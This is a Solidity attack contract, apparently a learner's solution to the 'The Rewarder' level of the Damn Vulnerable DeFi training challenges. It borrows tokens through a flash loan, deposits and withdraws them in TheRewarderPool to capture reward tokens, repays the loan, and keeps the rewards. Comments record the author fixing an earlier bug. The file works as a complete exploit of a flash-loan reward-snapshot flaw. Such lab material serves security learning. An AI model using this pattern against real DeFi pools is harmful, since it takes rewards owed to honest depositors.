//SPDX License-Identifier:MIT


import "./TheRewarderPool.sol";
import "../DamnValuableToken.sol";
import "./FlashLoanerPool.sol";
import "./RewardToken.sol";

contract AttackRewarderPool{
    
    TheRewarderPool immutable private pool;
    DamnValuableToken immutable private liquidityToken;
    FlashLoanerPool immutable private loaner_pool;
    RewardToken immutable private rewardTkn;

    constructor(address poolAddr, address tknAddr, address loanerAddr, address rewardTknAddr){
        pool = TheRewarderPool(poolAddr);
        liquidityToken = DamnValuableToken(tknAddr);
        loaner_pool = FlashLoanerPool(loanerAddr);
        rewardTkn = RewardToken(rewardTknAddr);
    }

    function executeFlashLoan(uint256 amount) public{
        liquidityToken.approve(address(pool),amount);
        loaner_pool.flashLoan(amount);
        // once all the liquidity token have been returned

        // Transfer the reward token to the attacker?
        // I instantiated a new token
        //This is my error
        /*
        RewardToken rewardTkn = new RewardToken();
        rewardTkn.transfer(msg.sender, rewardTkn.balanceOf(address(this)));
        */
        rewardTkn.transfer(msg.sender, rewardTkn.balanceOf(address(this)));
    }
    function receiveFlashLoan(uint256 amount) public {
        //This way i mint the account token and with the deposit fuction it distributes the reward token
        pool.deposit(amount);


        // I burn the account token and get back my DVT token
        pool.withdraw(amount);
        // Now i will return deposit bac the dvt token loaned
        liquidityToken.transfer(address(loaner_pool),amount);

    }
    
}